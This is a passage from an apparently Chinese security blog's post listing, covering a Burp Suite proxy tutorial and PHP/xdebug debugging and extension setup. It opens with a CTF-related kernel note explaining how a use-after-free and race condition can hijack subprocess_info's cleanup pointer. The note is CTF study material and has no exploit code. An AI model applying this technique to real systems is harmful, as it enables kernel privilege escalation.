<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">struct subprocess_info &#123;</span><br><span class="line">    struct work_struct work;</span><br><span class="line">    struct completion *complete;</span><br><span class="line">    const char *path;</span><br><span class="line">    char **argv;</span><br><span class="line">    char **envp;</span><br><span class="line">    struct file *file;</span><br><span class="line">    int wait;</span><br><span class="line">    int retval;</span><br><span class="line">    pid_t pid;</span><br><span class="line">    int (*init)(struct subprocess_info *info, struct cred *new);</span><br><span class="line">    void (*cleanup)(struct subprocess_info *info);</span><br><span class="line">    void *data;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></div></figure>

<p>该结构体在分配时最终会调用其中的<code>void (*cleanup)(struct subprocess_info *info);</code>函数指针，所以如果存在一个UAF和条件竞争，在分配时启动另一个线程不断修改该函数指针，那么就能劫持程序流，再利用一些gadget就可以控制得到。</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/264563#h2-2" >SCTF flying_kernel 出题总结 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/01/09/Burpsuite%E4%BD%BF%E7%94%A8/">Burpsuite使用</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-01-09</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-01-11</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="一、配置"   >
          <a href="#一、配置" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、配置" class="headerlink" title="一、配置"></a>一、配置</h1>
      
        <h2 id="1-配置浏览器代理"   >
          <a href="#1-配置浏览器代理" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-配置浏览器代理" class="headerlink" title="1.配置浏览器代理"></a>1.配置浏览器代理</h2>
      
        <h3 id="1-安装"   >
          <a href="#1-安装" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-安装" class="headerlink" title="(1)安装"></a>(1)安装</h3>
      <p>Edge安装插件Proxy SwitchyOmega</p>

        <h3 id="3-设置"   >
          <a href="#3-设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-设置" class="headerlink" title="(3)设置"></a>(3)设置</h3>
      <p>进入选项</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091240977.png" alt="image-20220109124055943"></p>
<p>配置如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091241223.png" alt="image-20220109124123157"></p>

        <h2 id="2-配置BurpSuite"   >
          <a href="#2-配置BurpSuite" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-配置BurpSuite" class="headerlink" title="2.配置BurpSuite"></a>2.配置BurpSuite</h2>
      <p>Proxy-&gt;Options</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091242646.png" alt="image-20220109124203603"></p>
<p>没有的可以点旁边的Add按钮添加。</p>

        <h1 id="二、使用"   >
          <a href="#二、使用" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、使用" class="headerlink" title="二、使用"></a>二、使用</h1>
      
        <h2 id="1-抓包"   >
          <a href="#1-抓包" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-抓包" class="headerlink" title="1.抓包"></a>1.抓包</h2>
      
        <h3 id="1-Edge浏览器开启代理"   >
          <a href="#1-Edge浏览器开启代理" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-Edge浏览器开启代理" class="headerlink" title="(1)Edge浏览器开启代理"></a>(1)Edge浏览器开启代理</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091806742.png" alt="image-20220109180624711"></p>
<p>选中如图代理</p>
<p>然后继续点击网页</p>

        <h3 id="2-Burpsuite开启"   >
          <a href="#2-Burpsuite开启" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-Burpsuite开启" class="headerlink" title="(2)Burpsuite开启"></a>(2)Burpsuite开启</h3>
      <p>Burpsuit中</p>
<p>Proxy-&gt;Intercept处，如果点击如下按钮</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091809028.png" alt="image-20220109180945990"></p>
<p>那么每接收一个包，BurpSuite都会拦截，需要点击Froward继续，或者丢弃Drop该包，页面才会继续加载。</p>
<p>然后到Target-&gt;Site map处，即可看到拦截的文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091812502.png" alt="image-20220109181204449"></p>

        <h2 id="2-改包"   >
          <a href="#2-改包" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-改包" class="headerlink" title="2.改包"></a>2.改包</h2>
      
        <h3 id="1-先抓包"   >
          <a href="#1-先抓包" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-先抓包" class="headerlink" title="(1)先抓包"></a>(1)先抓包</h3>
      <p>首先浏览器开启代理，BurpSuite抓到包</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111424692.png" alt="image-20220111141339457"></p>

        <h3 id="2-发送到Repeater"   >
          <a href="#2-发送到Repeater" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-发送到Repeater" class="headerlink" title="(2)发送到Repeater"></a>(2)发送到Repeater</h3>
      <p>然后将包发送到<code>repeater</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111424737.png" alt="image-20220111141424655"></p>
<p>在Repeater最新出现的一部分就是</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111424733.png" alt="image-20220111141531436"></p>
<p>修改然后使用点击Go即可发送修改之后的包，Response接收反馈的包并解析</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/01/06/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">PHP环境搭建</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-01-06</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-02-11</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="一、调试搭建"   >
          <a href="#一、调试搭建" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、调试搭建" class="headerlink" title="一、调试搭建"></a>一、调试搭建</h1>
      
        <h2 id="🔺Windows版本"   >
          <a href="#🔺Windows版本" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺Windows版本" class="headerlink" title="🔺Windows版本"></a>🔺Windows版本</h2>
      
        <h2 id="1-前置安装"   >
          <a href="#1-前置安装" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-前置安装" class="headerlink" title="1.前置安装"></a>1.前置安装</h2>
      <p>phpstorm+phpStudy</p>
<p>这两个需要先装好，之后利用phpStudy中自带的xdebug来调试</p>

        <h2 id="2-phpStudy设置"   >
          <a href="#2-phpStudy设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-phpStudy设置" class="headerlink" title="2.phpStudy设置"></a>2.phpStudy设置</h2>
      
        <h3 id="1-php版本"   >
          <a href="#1-php版本" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-php版本" class="headerlink" title="(1)php版本"></a>(1)php版本</h3>
      <p>这里我的php选择的是如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071053181.png" alt="image-20220107105326110"></p>

        <h3 id="2-打开xdebug"   >
          <a href="#2-打开xdebug" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-打开xdebug" class="headerlink" title="(2)打开xdebug"></a>(2)打开xdebug</h3>
      <p>单击设置-&gt;扩展组件，设置如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071054040.png" alt="image-20220107105424985"></p>

        <h3 id="3-修改php-ini"   >
          <a href="#3-修改php-ini" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-修改php-ini" class="headerlink" title="(3)修改php.ini"></a>(3)修改php.ini</h3>
      <p>然后主界面设置-&gt;php.ini-&gt;单击对应版本，即可打开php.ini配置文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071055085.png" alt="image-20220107105552036"></p>
<p>打开之后，在最下面的xdebug设置如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[Xdebug]</span><br><span class="line">xdebug.idekey = PHPSTORM</span><br><span class="line">zend_extension=D:/phpstudy_pro/Extensions/php/php7.3.4nts/ext/php_xdebug.dll</span><br><span class="line">xdebug.collect_params=1</span><br><span class="line">xdebug.collect_return=1</span><br><span class="line">xdebug.auto_trace=On</span><br><span class="line">xdebug.trace_output_dir=D:/phpstudy_pro/Extensions/php_log/php7.3.4nts.xdebug.trace</span><br><span class="line">xdebug.profiler_enable=On</span><br><span class="line">xdebug.profiler_output_dir=D:/phpstudy_pro/Extensions/php_log/php7.3.4nts.xdebug.profiler</span><br><span class="line">xdebug.remote_enable=On</span><br><span class="line">xdebug.remote_host=localhost</span><br><span class="line">xdebug.remote_port=9000</span><br><span class="line">xdebug.remote_handler=dbgp</span><br></pre></td></tr></table></div></figure>

<p>这里参考<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/baocheng/p/5775938.html" >https://www.cnblogs.com/baocheng/p/5775938.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>  相关的会更加详细。</p>
<p>主要是设置<code>xdebug.remote_handler</code>，<code>xdebug.remote_port</code>，<code>xdebug.remote_host</code>，<code>xdebug.profiler_enable</code>，<code>xdebug.idekey</code>，<code>xdebug.remote_enable</code></p>

        <h3 id="4-网站路径设置"   >
          <a href="#4-网站路径设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-网站路径设置" class="headerlink" title="(4)网站路径设置"></a>(4)网站路径设置</h3>
      <p>主界面网站-&gt;管理-&gt;修改-&gt;根目录，然后设置为在phpStorm中存放php文件的目录，没有的可以直接创建一个</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071114807.png" alt="image-20220107111415751"></p>

        <h3 id="5-开启服务"   >
          <a href="#5-开启服务" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-开启服务" class="headerlink" title="(5)开启服务"></a>(5)开启服务</h3>
      <p>phpStudy中开启对应的网站服务即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071128163.png" alt="image-20220107112835096"></p>

        <h2 id="3-phpstorm设置"   >
          <a href="#3-phpstorm设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-phpstorm设置" class="headerlink" title="3.phpstorm设置"></a>3.phpstorm设置</h2>
      
        <h3 id="1-PHP版本选择"   >
          <a href="#1-PHP版本选择" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-PHP版本选择" class="headerlink" title="(1)PHP版本选择"></a>(1)PHP版本选择</h3>
      <p>版本选择之前我们的设置好的相关版本</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071103174.png" alt="image-20220107110300128"></p>
<p>这里的CLI interpreter需要选择phpStudy中的php，点击旁边的<code>...</code>按钮，找到对应的php.exe添加即可，大多的路径如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071104002.png" alt="image-20220107110410950"></p>

        <h3 id="2-xdebug配置"   >
          <a href="#2-xdebug配置" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-xdebug配置" class="headerlink" title="(2)xdebug配置"></a>(2)xdebug配置</h3>
      <p>打开phpstorm，打开setting-&gt;PHP-&gt;Debug，xdebug配置如下，主要是端口对应</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071100474.png" alt="image-20220107110012400"></p>
<p>PHP-&gt;Debug-&gt;DBGp Proxy，进行相关设置</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071106492.png" alt="image-20220107110614445"></p>

        <h3 id="3-服务器端配置"   >
          <a href="#3-服务器端配置" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-服务器端配置" class="headerlink" title="(3)服务器端配置"></a>(3)服务器端配置</h3>
      <p>setting-&gt;server</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071101687.png" alt="image-20220107110138638"></p>
<p>没有的自行+号添加，名字自己定义</p>

        <h3 id="4-配置php文件路径"   >
          <a href="#4-配置php文件路径" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-配置php文件路径" class="headerlink" title="(4)配置php文件路径"></a>(4)配置php文件路径</h3>
      <p>Run-&gt;Edit Configurations</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071108373.png" alt="image-20220107110807337"></p>
<p>然后添加对应的调试路径</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071110934.png" alt="image-20220107111003896"></p>
<p>对应设置</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071111653.png" alt="image-20220107111151592"></p>

        <h2 id="4-开始调试"   >
          <a href="#4-开始调试" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-开始调试" class="headerlink" title="4.开始调试"></a>4.开始调试</h2>
      <p>然后在phpStorm中对应网站的目录下的文件即可下断点开始调试</p>

        <h3 id="1-开始监听"   >
          <a href="#1-开始监听" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-开始监听" class="headerlink" title="(1)开始监听"></a>(1)开始监听</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071115224.png" alt="image-20220107111554195"></p>
<p>设置好调试环境，然后点旁边的电话，使其变成如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071116386.png" alt="image-20220107111631356"></p>

        <h3 id="2-调试"   >
          <a href="#2-调试" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-调试" class="headerlink" title="(2)调试"></a>(2)调试</h3>
      <p>在文件中下断点，点击debug即可开始调试</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071124166.png" alt="image-20220107112446079"></p>

        <h2 id="🔺Linux版本"   >
          <a href="#🔺Linux版本" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺Linux版本" class="headerlink" title="🔺Linux版本"></a>🔺Linux版本</h2>
      
        <h2 id="1-前置安装-1"   >
          <a href="#1-前置安装-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-前置安装-1" class="headerlink" title="1.前置安装"></a>1.前置安装</h2>
      <p>用的也是PHPSTORM和宝塔linux</p>

        <h2 id="2-宝塔linux设置"   >
          <a href="#2-宝塔linux设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-宝塔linux设置" class="headerlink" title="2.宝塔linux设置"></a>2.宝塔linux设置</h2>
      
        <h3 id="1-安装xdebug"   >
          <a href="#1-安装xdebug" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-安装xdebug" class="headerlink" title="(1)安装xdebug"></a>(1)安装xdebug</h3>
      <p>安装好PHP之后，设置安装PHP的拓展</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131101953.png" alt="image-20220113110140841"></p>

        <h3 id="2-配置php-ini"   >
          <a href="#2-配置php-ini" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-配置php-ini" class="headerlink" title="(2)配置php.ini"></a>(2)配置php.ini</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131102613.png" alt="image-20220113110241556"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[XDebug]</span><br><span class="line">; 允许远程 可以为 On 或者 1 都表示启用 ， Off 和 0 表示关闭关闭</span><br><span class="line">xdebug.remote_enable = On</span><br><span class="line">; 远程主机的 IP 这里我们填写，固定的 127.0.0.1 这里写的是PHPSTORM所在的那台机器上的IP</span><br><span class="line">xdebug.remote_host = 127.0.0.1</span><br><span class="line">; 调试连接端口 请记住这个端口，后续会用到。此配置项默认值为 9000 ，但是通常 9000 端口被 fpm 占据 ，故更换端口。</span><br><span class="line">; 另外，请在你服务器的控制面板和服务器防火墙中开放这个端口的进出站。</span><br><span class="line">; 如果你是宝塔面板用户 请放行此端口。</span><br><span class="line">xdebug.remote_port = 9001</span><br><span class="line">; 接下来的值都是可选的，但是我推荐你使用</span><br><span class="line">; 连接 IDE 的 Key，请记住他，可以自己自定义，主要用来过滤请求。</span><br><span class="line">xdebug.idekey=PHPSTORM</span><br><span class="line">xdebug.remote_handler=dbgp</span><br><span class="line">xdebug.collect_params=1</span><br><span class="line">xdebug.collect_return=1</span><br><span class="line">xdebug.auto_trace=On</span><br><span class="line">xdebug.profiler_enable=On</span><br></pre></td></tr></table></div></figure>

<p>参照</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.t1h2ua.cn/archives/69" >Linux内网服务器+宝塔+Xdebug远程调试配置 – T1h2ua’s Blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>保存之后，重载一下配置</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131104394.png" alt="image-20220113110410355"></p>

        <h3 id="3-网站路径设置"   >
          <a href="#3-网站路径设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-网站路径设置" class="headerlink" title="(3)网站路径设置"></a>(3)网站路径设置</h3>
      <p>宝塔Linux中点击网站，添加站点</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131105621.png" alt="image-20220113110540548"></p>
<p>得到如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131106699.png" alt="image-20220113110610661"></p>

        <h3 id="4-开启服务"   >
          <a href="#4-开启服务" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-开启服务" class="headerlink" title="(4)开启服务"></a>(4)开启服务</h3>
      <p>记得把对应的服务打开，nginx/apache和php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131107520.png" alt="image-20220113110735466"></p>

        <h3 id="5-放行9001端口"   >
          <a href="#5-放行9001端口" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-放行9001端口" class="headerlink" title="(5)放行9001端口"></a>(5)放行9001端口</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131115950.png" alt="image-20220113111553907"></p>

        <h2 id="3-phpStorm设置"   >
          <a href="#3-phpStorm设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-phpStorm设置" class="headerlink" title="3.phpStorm设置"></a>3.phpStorm设置</h2>
      <p>这里就都差不多，选择php版本，配置xdebug，配置Server，配置php文件路径，注意这里选取的端口为9001</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131109452.png" alt="image-20220113110926412"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131110087.png" alt="image-20220113111016050"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131109570.png" alt="image-20220113110938531"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131110947.png" alt="image-20220113111029912"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131112793.png" alt="image-20220113111210749"></p>
<p>然后就可以调试了。</p>

        <h2 id="🔺注："   >
          <a href="#🔺注：" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺注：" class="headerlink" title="🔺注："></a>🔺注：</h2>
      <p>xdebug3.0以上的，配置有点变化，如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[XDebug]</span><br><span class="line">xdebug.mode = develop,debug</span><br><span class="line">xdebug.start_with_request = default|default</span><br><span class="line">;xdebug.start_with_request = yes ;当改为yes时所有请求都会走debug，不需要设置idekey </span><br><span class="line">xdebug.client_host = 127.0.0.1 </span><br><span class="line">xdebug.client_port = 9001</span><br><span class="line">xdebug.remote_handler = dbgp</span><br><span class="line">xdebug.idekey = PHPSTORM</span><br><span class="line">xdebug.cli_color = 2</span><br><span class="line">xdebug.var_display_max_depth = 15</span><br><span class="line">xdebug.var_display_max_data  = 2048</span><br></pre></td></tr></table></div></figure>




        <h1 id="二、数据库搭建"   >
          <a href="#二、数据库搭建" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、数据库搭建" class="headerlink" title="二、数据库搭建"></a>二、数据库搭建</h1>
      
        <h2 id="1-phpStudy设置"   >
          <a href="#1-phpStudy设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-phpStudy设置" class="headerlink" title="1.phpStudy设置"></a>1.phpStudy设置</h2>
      
        <h3 id="1-创建数据库"   >
          <a href="#1-创建数据库" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-创建数据库" class="headerlink" title="(1)创建数据库"></a>(1)创建数据库</h3>
      <p>设置数据库，没有就创建，鼠标碰到密码可以查看</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091150517.png" alt="image-20220109115051455"></p>

        <h3 id="2-打开MySQL数据库"   >
          <a href="#2-打开MySQL数据库" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-打开MySQL数据库" class="headerlink" title="(2)打开MySQL数据库"></a>(2)打开MySQL数据库</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091152262.png" alt="image-20220109115216201"></p>

        <h2 id="2-phpStorm设置"   >
          <a href="#2-phpStorm设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-phpStorm设置" class="headerlink" title="2.phpStorm设置"></a>2.phpStorm设置</h2>
      
        <h3 id="1-设置"   >
          <a href="#1-设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-设置" class="headerlink" title="(1)设置"></a>(1)设置</h3>
      <p>view-&gt;Tool Windows-&gt;databases</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091153202.png" alt="image-20220109115314160"></p>
<p>然后创建一个连接</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091153527.png" alt="image-20220109115352472"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091154448.png" alt="image-20220109115418414"></p>
<p>对应输入host，账号密码即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091154268.png" alt="image-20220109115447217"></p>

        <h3 id="2-查看控制"   >
          <a href="#2-查看控制" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-查看控制" class="headerlink" title="(2)查看控制"></a>(2)查看控制</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091155976.png" alt="image-20220109115523944"></p>
<p>view-&gt;tool windows-&gt;database之后，双击上面红框可以进入控制界面</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091156880.png" alt="image-20220109115615823"></p>
<p>然后就正常了。</p>

        <h1 id="三、PHP模块搭建"   >
          <a href="#三、PHP模块搭建" class="heading-link"><i class="fas fa-link"></i></a><a href="#三、PHP模块搭建" class="headerlink" title="三、PHP模块搭建"></a>三、PHP模块搭建</h1>
      
        <h2 id="1-创建模块模板"   >
          <a href="#1-创建模块模板" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-创建模块模板" class="headerlink" title="1.创建模块模板"></a>1.创建模块模板</h2>
      <p>找到php源码目录</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202101746346.png" alt="image-20220210174644261"></p>
<p>然后使用<code>ext_skel</code>创建一个模板</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ext_skel --extname=helloworld</span><br></pre></td></tr></table></div></figure>


        <h2 id="2-编译模块"   >
          <a href="#2-编译模块" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-编译模块" class="headerlink" title="2.编译模块"></a>2.编译模块</h2>
      <p>随后进行编译，跳转到刚刚生成的模块文件夹路径<code>/path_to_php_src/ext/helloworld</code>，然后编译</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/www/server/php/56/bin/phpize</span><br><span class="line">./configure  --with-php-config=/www/server/php/56/bin/php-config</span><br></pre></td></tr></table></div></figure>

<p>这里需要指定一下<code>--with-php-config</code>，选择自己的<code>php-config</code>，当然如果本地的环境变量bin命令下直接有<code>php-config</code>也不用指定了，随后</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></div></figure>

<p>这样就可以在当前目录下生成了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202101759576.png" alt="image-20220210175900511"></p>
<p>其中<code>helloworld.c</code>即为创建的模板代码，但是不知道为什么5.6版本的编译完成后，不生成.so模块文件，可能是版本特性？</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* helloword extension for PHP */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_CONFIG_H</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&quot;config.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;php.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span 